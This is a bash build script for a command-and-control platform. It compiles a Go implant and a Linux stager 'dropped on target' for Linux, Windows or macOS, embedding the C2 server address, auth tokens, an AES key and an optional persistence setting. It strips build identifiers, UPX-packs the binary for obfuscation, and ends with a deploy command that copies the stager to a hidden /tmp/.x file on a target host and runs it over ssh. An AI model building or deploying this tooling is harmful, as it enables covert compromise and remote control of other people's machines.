#!/usr/bin/env bash
set -euo pipefail

# ---------------------------------------------------------------------------
# build-stager.sh — Build the Go implant + stager for the C2 platform
#
# Usage:
#   ./scripts/build-stager.sh                               # build both, linux amd64
#   ./scripts/build-stager.sh --os windows                  # cross-compile for Windows
#   ./scripts/build-stager.sh --os darwin                   # cross-compile for macOS
#   ./scripts/build-stager.sh --server 10.0.0.5:8443 --token s3cr3t
#   ./scripts/build-stager.sh --no-upx                      # skip UPX compression
#
# Produces:
#   /tmp/implant-<os>      — full implant binary (UPX compressed)
#   /tmp/implant-<os>.raw  — uncompressed implant (if UPX was run)
#   /tmp/stager-<os>       — tiny stager (deployed to target)
# ---------------------------------------------------------------------------

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
IMPLANT_DIR="$SCRIPT_DIR/src/c2/implant"
GOROOT="${GOROOT:-/tmp/go}"
GO="$GOROOT/bin/go"

SERVER_ADDR="${SERVER_ADDR:-localhost:8443}"
STAGER_TOKEN="${STAGER_TOKEN:-stag3r-t0k3n-change}"
IMPLANT_TOKEN="${IMPLANT_TOKEN:-$STAGER_TOKEN}"
AES_KEY_HEX="${AES_KEY_HEX:-}"
NO_PERSIST="${NO_PERSIST:-true}"
TARGET_OS="${TARGET_OS:-linux}"
NO_UPX="${NO_UPX:-false}"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --server)        SERVER_ADDR="$2"; shift 2 ;;
    --token)         STAGER_TOKEN="$2"; shift 2 ;;
    --implant-token) IMPLANT_TOKEN="$2"; shift 2 ;;
    --aes-key)       AES_KEY_HEX="$2"; shift 2 ;;
    --persist)       NO_PERSIST="false"; shift ;;
    --proxy)         PROXY_ADDR="$2"; shift 2 ;;
    --goroot)        GOROOT="$2"; shift 2 ;;
    --os)            TARGET_OS="$2"; shift 2 ;;
    --no-upx)        NO_UPX="true"; shift ;;
    *) echo "Unknown: $1"; exit 1 ;;
  esac
done

case "$TARGET_OS" in
  linux)   GOOS="linux" ; GOARCH="amd64" ;;
  windows) GOOS="windows" ; GOARCH="amd64" ;;
  darwin)  GOOS="darwin" ; GOARCH="amd64" ;;
  *) echo "Unsupported --os: $TARGET_OS (use linux, windows, or darwin)"; exit 1 ;;
esac

OUT_IMPLANT="/tmp/implant-${TARGET_OS}"
OUT_IMPLANT_RAW="/tmp/implant-${TARGET_OS}.raw"
OUT_STAGER="/tmp/stager-${TARGET_OS}"

# Build implant args string
STAGER_X=""
STAGER_X="$STAGER_X -X main.serverAddr=$SERVER_ADDR -X main.authToken=$STAGER_TOKEN -X main.implantToken=$IMPLANT_TOKEN"
if [ "$NO_PERSIST" = "true" ]; then
  STAGER_X="$STAGER_X -X main.noPersist=true"
fi

GO="$GOROOT/bin/go"
echo "  GOROOT: $GOROOT"
echo "  target: $TARGET_OS (GOOS=$GOOS GOARCH=$GOARCH)"
echo "  server: $SERVER_ADDR"
echo "  output: $OUT_IMPLANT + $OUT_STAGER"
echo "  upx:    $([ "$NO_UPX" = "true" ] && echo 'SKIPPED' || echo 'ENABLED')"

# ---------------------------------------------------------------------------
# 1. Build the full implant (served by the C2 server)
# ---------------------------------------------------------------------------
echo ""
echo "==> Building implant [$TARGET_OS]..."
cd "$IMPLANT_DIR"
GOOS=$GOOS GOARCH=$GOARCH $GO build \
  -ldflags="-s -w -buildid=" \
  -trimpath \
  -buildmode=pie \
  -o "$OUT_IMPLANT" .
echo "    $(ls -lh "$OUT_IMPLANT" | awk '{print $5}')  $OUT_IMPLANT"

# ---------------------------------------------------------------------------
# 2. UPX compress the implant binary
# ---------------------------------------------------------------------------
if [ "$NO_UPX" = "false" ] && command -v upx &>/dev/null; then
  echo ""
  echo "==> Compressing implant with UPX..."
  mv "$OUT_IMPLANT" "$OUT_IMPLANT_RAW"
  upx --best --lzma -o "$OUT_IMPLANT" "$OUT_IMPLANT_RAW" 2>&1 | tail -1
  echo "    $(ls -lh "$OUT_IMPLANT" | awk '{print $5}')  $OUT_IMPLANT (compressed)"
  echo "    raw backup: $OUT_IMPLANT_RAW"
elif [ "$NO_UPX" = "false" ]; then
  echo ""
  echo "==> UPX not found — install it for smaller/obfuscated binaries"
  echo "    apt install upx / brew install upx / choco install upx"
fi

# ---------------------------------------------------------------------------
# 2. Build the stager (dropped on target) — Linux only (memfd_create)
# ---------------------------------------------------------------------------
if [ "$TARGET_OS" = "linux" ]; then
  echo ""
  echo "==> Building stager [$TARGET_OS]..."
  cd "$IMPLANT_DIR"

  XFLAGS="-s -w $STAGER_X"
  if [ -n "$AES_KEY_HEX" ]; then
    XFLAGS="$XFLAGS -X main.aesKeyHex=$AES_KEY_HEX"
  fi
  if [ -n "${PROXY_ADDR:-}" ]; then
    XFLAGS="$XFLAGS -X main.proxyAddr=$PROXY_ADDR"
  fi

  GOOS=$GOOS GOARCH=$GOARCH $GO build -ldflags="$XFLAGS" -trimpath -o "$OUT_STAGER" ./stager/
  echo "    $(ls -lh "$OUT_STAGER" | awk '{print $5}')  $OUT_STAGER"
else
  echo ""
  echo "==> Skipping stager [$TARGET_OS] (stager is Linux-only; dropping implant as standalone)"
fi

# ---------------------------------------------------------------------------
# 3. Summary
# ---------------------------------------------------------------------------
echo ""
echo "==> Done."
echo "    C2_IMPLANT_PATH=$OUT_IMPLANT"
echo "    C2_STAGER_TOKEN=$STAGER_TOKEN"
echo ""
if [ "$TARGET_OS" = "linux" ]; then
  echo "    stager -> $SERVER_ADDR (token: $STAGER_TOKEN)"
else
  echo "    stager: n/a (Linux only)"
fi
echo "    implant token: $IMPLANT_TOKEN"
echo "    persist: $([ "$NO_PERSIST" = "false" ] && echo 'YES' || echo 'NO')"
echo "    proxy:  ${PROXY_ADDR:-none}"
echo ""
echo "    deploy:  scp $OUT_STAGER target:/tmp/.x && ssh target '/tmp/.x'"
